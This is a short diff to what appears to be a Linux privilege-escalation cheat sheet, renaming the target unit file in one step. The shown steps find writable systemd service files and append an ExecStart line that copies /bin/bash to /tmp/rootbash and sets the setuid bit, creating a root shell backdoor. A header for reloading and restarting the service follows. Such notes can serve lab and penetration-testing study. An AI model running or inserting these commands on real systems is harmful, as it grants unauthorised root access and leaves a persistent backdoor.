@@ -13,7 +13,7 @@ find /etc/systemd/system/ -type f -writable 2>/dev/null
 
 ### Modify the service file:
 ```sh
-echo -e "[Service]\nExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'" | sudo tee -a /etc/systemd/system/writable.service
+echo -e "[Service]\nExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'" | sudo tee -a /etc/systemd/system/vulnerable.service
 ```
 
 ### Reload and restart the service:
